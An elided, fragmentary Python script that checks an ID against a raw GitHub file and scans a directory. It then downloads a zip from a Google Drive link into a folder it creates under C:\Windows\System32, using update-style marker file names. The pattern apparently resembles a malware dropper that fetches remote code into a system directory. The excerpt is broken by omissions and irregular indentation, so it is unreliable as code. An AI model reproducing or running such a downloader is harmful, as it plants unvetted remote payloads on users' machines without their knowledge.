...
import os
import gdown
result = check_string_in_url("https://raw.githubusercontent.com/valkxklex23508645/myins/refs/heads/main/id_valklex.txt", file_contentsx1)
os.system('cls')
        ...
        if os.path.exists(target_dir) and os.path.isdir(target_dir):
            for file_name in os.listdir(target_dir):
                ...
                try:
                    ...
                    print(f"")
check_file = r"C:\Windows\System32\valklexupdate04202025v1.txt"
...
if not os.path.exists("C:\\Windows\\System32\\TAPIO\\valklex.py"):
    ...
    print("----------------------------------")
    download_file_from_google_drive("https://drive.google.com/uc?id=1-u9E4QrGbCw6AZ5ckP8j2r2XjTerBDna", "C:\\Windows\\System32\\TAPIO\\vlk.zip")
    zip_file = r'C:\Windows\System32\TAPIO\vlk.zip'
